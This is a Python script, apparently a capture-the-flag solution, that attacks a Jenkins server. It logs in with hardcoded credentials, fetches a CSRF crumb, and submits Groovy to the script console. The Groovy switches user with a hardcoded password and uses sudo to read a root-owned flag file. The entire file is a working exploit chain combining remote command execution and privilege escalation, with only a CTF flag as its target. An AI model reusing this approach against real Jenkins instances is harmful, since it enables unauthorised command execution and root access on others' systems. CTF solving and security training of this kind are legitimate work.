#!/usr/bin/env python

import requests
import sys

if len(sys.argv) < 2:
    print("Please provide IP address of your box")
    exit(0)

JENKINS_USERNAME = "thebutler"
JENKINS_PASSWORD = "WEAREWATCHINGYOU!"
USERNAME = "thatbguy"
PASSWORD = "oFaQuoot8aehae"

IP = sys.argv[1]
# IP = "184.72.154.227"

print(f"Hacking {IP} box")

url = f"http://{IP}:8080/"

s = requests.Session()

s.post(url + "j_acegi_security_check", data={
    "j_username": f"{JENKINS_USERNAME}",
    "j_password": f"{JENKINS_PASSWORD}",
    "from": "/",
    "Submit": "Sign in"
})
r = s.get(url + "crumbIssuer/api/json")
json = r.json()

r = s.post(url + "script", data={
    "script": f"""def sout = new StringBuilder(), serr = new StringBuilder()
def proc = 'su {USERNAME}'.execute()
proc.consumeProcessOutput(sout, serr)
proc << "{PASSWORD}\\n"
proc.consumeProcessOutput(sout, serr)
proc << "sudo -S cat /root/FinalFlag.txt \\n"
proc.consumeProcessOutput(sout, serr)
proc << "{PASSWORD}\\n"
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "xout>$sout\\nxerr>$serr"
""",
    json["crumbRequestField"]: json["crumb"],
    "Submit": "Run"
})
flag = r.text
flag = flag.split("xout>")[2]
flag = flag.split("xerr>")[0]
flag = flag.strip()
print(f"Final Flag = {flag}")
s.close()
